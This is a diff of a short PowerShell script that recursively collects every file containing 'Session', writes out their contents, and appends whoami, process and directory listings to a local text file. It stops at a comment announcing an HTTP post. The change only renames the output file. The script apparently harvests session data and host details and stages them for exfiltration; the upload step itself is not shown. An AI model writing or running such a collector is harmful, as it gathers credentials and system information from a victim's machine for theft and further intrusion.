@@ -1,14 +1,14 @@
 Get-ChildItem -Recurse | Where-Object {(Select-String -InputObject $_ -Pattern 'Session' -Quiet) -eq $true} | ForEach-Object {Write-Output $_; Get-Content $_} | Out-File -FilePath ./Process2.txt 
 
-whoami | Out-File -FilePath ./Process2.txt -Append
+whoami | Out-File -FilePath ./Process5.txt -Append
 
 Start-Sleep -Seconds 1.5
 
-ps | Out-File -FilePath ./Process2.txt -Append
+ps | Out-File -FilePath ./Process5.txt -Append
 
 Start-Sleep -Seconds 1.5
 
-ls | Out-File -FilePath ./Process2.txt -Append
+ls | Out-File -FilePath ./Process5.txt -Append
 
 
 #start http post 
